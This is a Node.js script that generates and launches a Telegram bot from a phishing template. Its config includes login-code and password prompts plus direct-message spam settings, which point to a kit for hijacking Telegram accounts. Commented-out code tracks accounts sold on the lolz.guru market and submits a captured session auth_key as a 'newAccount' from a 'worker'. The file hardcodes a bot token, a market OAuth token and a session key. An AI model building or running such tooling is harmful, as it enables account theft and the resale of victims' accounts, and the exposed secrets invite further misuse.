const createConfig = require("./botCreatingTools/createConfig");
const createBot = require("./botCreatingTools/createBot");
const cmdWorking = require("./botCreatingTools/cmdWorking");
const fs = require("fs");

const path = "./bots/1231";

fs.existsSync(path) || fs.mkdirSync(path);

const config = createConfig("5722806586:AAFhIoDynQz_OcjCzYKN2M_KHkqFOFJv2no","5409656596", {joinChannels: [], channelsSpam: [], dmSpam: true, spamText: "1"}, {authorizationButtonText: "1", startText: "hi!", connectionText: "hi!", codeText: "1", errorSendCodeText: "!", validCodeText: "1", invalidCodeErrorText: "invalidCodeErrorText", passwordNeedErrorText: "passwordNeedErrorText", invalidPasswordError:"1"})
createBot(config, path, "./phishExamp");
cmdWorking(`cd ${path} & python bot.py`);

/*
const axios = require("axios");
const config = require("./config");

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

axios.get("https://api.lolz.guru/users/me?oauth_token=183c58b93d8221f514a0467dee12dddd9d70d394").then(async res => {
    const user_id = res.data.user.user_id;
    console.log(user_id)
    await sleep(3000)
    const res2 = await axios.get(`https://api.lolz.guru/market/user/${user_id}/items?oauth_token=183c58b93d8221f514a0467dee12dddd9d70d394&show=paid`);
    console.log(res2.data);
})

 */

/*

let updates = [];
let selledAccs = [];

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

const getUpdates = async () => {
    const selledAccs_data_now = await axios.get(`https://api.lolz.guru/market/user/${config.lolzId}/items?oauth_token=${config.lolzToken}&show=paid`);
    const selledAccs_now = selledAccs_data_now.data.items;

    if(selledAccs.length == 0) selledAccs = selledAccs_now.map(selledAcc => selledAcc.item_id);

    for(let selledAcc of selledAccs_now) {
        console.log(selledAccs)
        console.log(selledAcc.item_id)
        if(selledAcc.item_id == selledAccs[0]) { break; }

        updates.push({"status": "accSelled", "accLink": `https://lolz.guru/market/${selledAcc.item_id}`, "price": selledAcc.price});
    }

    selledAccs = selledAccs_now.map(selledAcc => selledAcc.item_id);

    console.log("Get updates!");
    console.log(updates);
    return;
}

const checkUpdates = new Promise(async (reslove, reject) => {
    while(true)
    {
        await getUpdates();
        await sleep(3000);
    }
})

axios.post("http://localhost:5000/newAccount", {worker_id: "5409656596", dc_id: "4", auth_key: "ac2dc80d4192b4fe26b3e98a640abe57ff5c00eec57a708869aa1f5d87305ccd2c9d93e28b16a820afb375191fc0c474e49f3aa626e472093b846610f47ff159d78609ca2df2ee4138d9b24a93bdd57636450251b001df6edc9a0840269d95028d54bb5489c691c3359f202784d31bef41aeb0dc83f10a3a81f544809ecec7f6def5c76512d682fe4cfea59d5ecae39dd7d346c3cd1a8ff3e77b98b1ba0f53d5a11bb16178ee7cf1b22942fb78226365389cf84ef64e5273bf10f3799cbc8c6b4595747a1d72b2e90ab0be63daa9ead72d067eb872ed2b0aa5cad3a7c364336cb7f02d58fb2cdd3c6cb57519d5cd571eb079c605814dfcb1fb17056c59961240"})

*/